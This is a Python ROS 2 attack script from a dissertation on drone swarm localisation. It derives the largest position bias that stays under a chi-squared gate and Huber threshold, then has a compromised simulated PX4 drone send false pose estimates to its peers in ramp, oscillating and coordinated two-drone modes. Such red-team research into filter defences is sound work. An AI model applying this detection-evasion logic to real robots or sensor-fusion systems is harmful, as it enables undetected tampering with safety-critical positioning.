#!/usr/bin/env python3
"""
Targeted EKF+χ²+Huber Attack  — Finding F4
============================================
Mathematically derived exploit of EKF+χ²+Huber's specific parameters:

  CHI2_THRESHOLD = 7.815  (χ²(3 dof, p=0.95))
  HUBER_DELTA    = 0.5 m
  MEAS_NOISE_STD = 0.2 m  (R = 0.04 m² per axis)

Key finding:
  Max undetectable bias per axis (3-axis equal) = √(7.815 × 0.05 / 3) = 0.361 m
  This is BELOW Huber delta (0.5 m) → both defences bypassed simultaneously.

The attack stays 85% below the chi2 threshold at all times, making it
mathematically guaranteed to pass the gate under nominal S conditions.

Three modes:
  targeted_ramp     — linear ramp to 0.307 m, stays below chi2 and Huber
  targeted_osc      — oscillating bias, each sample individually below gate
  targeted_two_drone — two coordinated drones (requires px4_3 also compromised)

Run:
    python3 byzantine_targeted_ekf.py px4_2 targeted_ramp
    python3 byzantine_targeted_ekf.py px4_2 targeted_osc
    python3 byzantine_targeted_ekf.py px4_2 targeted_two_drone

STRIDE: Tampering, Elevation of Privilege
Research context: COMSM0117 dissertation, University of Bristol
"""
import os, sys, math, time, csv
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import PoseStamped

# ── Target parameters (from coop_loc_ekf_chi2_huber.py source) ───────────────
CHI2_THRESHOLD  = 7.815   # χ²(3 dof, p=0.95)
HUBER_DELTA     = 0.5     # metres
MEAS_NOISE_VAR  = 0.04    # m² per axis (R diagonal)
S_PER_AXIS      = 0.05    # m² — realistic S = R + H P H^T at steady state

# ── Mathematically derived safe bias ceiling ──────────────────────────────────
# Mahal² = 3 * b² / S  ≤  CHI2_THRESHOLD
# b ≤ √(CHI2_THRESHOLD * S / 3)
SAFE_BIAS_MARGIN = 0.85   # stay at 85% of theoretical maximum
MAX_BIAS         = math.sqrt(CHI2_THRESHOLD * S_PER_AXIS / 3) * SAFE_BIAS_MARGIN
# = 0.307 m — below both chi2 gate AND Huber delta

# ── Oscillating attack parameters ─────────────────────────────────────────────
OSC_AMPLITUDE    = MAX_BIAS * 0.9   # 0.276 m peak — well below gate
OSC_PERIOD       = 8.0              # seconds — slow enough for EKF to track

# ── Timing ────────────────────────────────────────────────────────────────────
WARMUP_SEC  = float(os.environ.get("SMOKE_WARMUP_SEC",  10.0))
RAMP_SEC    = float(os.environ.get("SMOKE_RAMP_SEC",    40.0))
ATTACK_SEC  = float(os.environ.get("SMOKE_ATTACK_SEC",  90.0))
PUBLISH_HZ  = 10.0

DRONE_NS    = sys.argv[1] if len(sys.argv) > 1 else "px4_2"
MODE        = sys.argv[2] if len(sys.argv) > 2 else "targeted_ramp"

HONEST_DRONES = ["px4_1", "px4_3", "px4_4", "px4_5"]
ALL_DRONES    = ["px4_1", "px4_2", "px4_3", "px4_4", "px4_5"]

SPAWN_POSITIONS = {
    "px4_1": [0.0, 0.0, 0.0],
    "px4_2": [2.0, 0.0, 0.0],
    "px4_3": [4.0, 0.0, 0.0],
    "px4_4": [2.0, 2.0, 0.0],
    "px4_5": [4.0, 2.0, 0.0],
}


class TargetedEKFAttack(Node):
    def __init__(self):
        super().__init__(f"byzantine_targeted_{DRONE_NS}")

        self._pubs = {}
        for drone in ALL_DRONES:
            topic = f"/{DRONE_NS}/coop/self_estimate"
            self._pubs[drone] = self.create_publisher(PoseStamped, topic, 10)

        # Subscribe to own real estimate to apply bias on top of live position
        self.true_pos  = SPAWN_POSITIONS[DRONE_NS][:]
        self.true_received = False
        self.create_subscription(
            PoseStamped,
            f"/{DRONE_NS}/coop/self_estimate_true",
            self._on_true, 10)

        self.t_start    = time.time()
        self.log_path   = f"/tmp/byzantine_targeted_{DRONE_NS}_{MODE}.csv"
        self.log_file   = open(self.log_path, "w", newline="")
        self.writer     = csv.writer(self.log_file)
        self.writer.writerow(["t_sec", "phase", "bias_x", "bias_y", "bias_z",
                               "mahal_sq_estimate", "below_gate"])

        self.create_timer(1.0 / PUBLISH_HZ, self._tick)

        self.get_logger().warn(
            f"[TARGETED] mode={MODE}  drone={DRONE_NS}  "
            f"max_bias={MAX_BIAS:.4f}m  chi2_threshold={CHI2_THRESHOLD}  "
            f"huber_delta={HUBER_DELTA}m\n"
            f"  Max bias < Huber delta: {MAX_BIAS < HUBER_DELTA} "
            f"→ bypasses BOTH defences simultaneously")

    def _on_true(self, msg):
        self.true_pos = [msg.pose.position.x,
                         msg.pose.position.y,
                         msg.pose.position.z]
        self.true_received = True

    def _compute_bias(self, elapsed):
        """Return (bias_x, bias_y, bias_z, phase_name) for current time."""
        t = elapsed

        if t < WARMUP_SEC:
            return 0.0, 0.0, 0.0, "WARMUP"

        t_attack = t - WARMUP_SEC

        if MODE == "targeted_ramp":
            # Linear ramp from 0 → MAX_BIAS over RAMP_SEC, then sustain
            if t_attack < RAMP_SEC:
                b = MAX_BIAS * (t_attack / RAMP_SEC)
                phase = "RAMP"
            else:
                b = MAX_BIAS
                phase = "SUSTAINED"
            return b, b, 0.0, phase   # bias on X and Y only

        elif MODE == "targeted_osc":
            # Sinusoidal — each sample individually below gate
            b = OSC_AMPLITUDE * math.sin(2 * math.pi * t_attack / OSC_PERIOD)
            phase = "OSCILLATING"
            return b, b * 0.5, 0.0, phase

        elif MODE == "targeted_two_drone":
            # Single drone contribution — use half the safe bias
            # Deploy simultaneously on px4_2 AND px4_3 for full effect
            b = MAX_BIAS * 0.6
            if t_attack < RAMP_SEC:
                b *= t_attack / RAMP_SEC
                phase = "COORDINATED_RAMP"
            else:
                phase = "COORDINATED_SUSTAINED"
            return b, b, 0.0, phase

        return 0.0, 0.0, 0.0, "UNKNOWN"

    def _tick(self):
        elapsed = time.time() - self.t_start
        if elapsed > ATTACK_SEC:
            self.get_logger().info("[TARGETED] Attack window complete.")
            rclpy.shutdown()
            return

        bx, by, bz, phase = self._compute_bias(elapsed)

        # Mahalanobis estimate for logging
        mahal_sq = (bx**2 + by**2 + bz**2) / S_PER_AXIS
        below    = mahal_sq < CHI2_THRESHOLD

        msg = PoseStamped()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.header.frame_id = "world"
        msg.pose.position.x = self.true_pos[0] + bx
        msg.pose.position.y = self.true_pos[1] + by
        msg.pose.position.z = self.true_pos[2] + bz

        for drone in HONEST_DRONES:
            self._pubs[drone].publish(msg)

        self.writer.writerow([
            f"{elapsed:.2f}", phase,
            f"{bx:.4f}", f"{by:.4f}", f"{bz:.4f}",
            f"{mahal_sq:.3f}", below])

        if int(elapsed) % 10 == 0 and elapsed % 1.0 < (1.0 / PUBLISH_HZ + 0.01):
            self.get_logger().warn(
                f"[TARGETED] t={elapsed:.0f}s  phase={phase}  "
                f"bias=({bx:.3f},{by:.3f},{bz:.3f})m  "
                f"mahal²={mahal_sq:.3f}/{CHI2_THRESHOLD}  "
                f"{'✓ BELOW GATE' if below else '✗ ABOVE GATE'}")

    def destroy_node(self):
        self.log_file.close()
        self.get_logger().info(f"[TARGETED] Log saved: {self.log_path}")
        super().destroy_node()


def main():
    rclpy.init()
    node = TargetedEKFAttack()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()

if __name__ == "__main__":
    main()
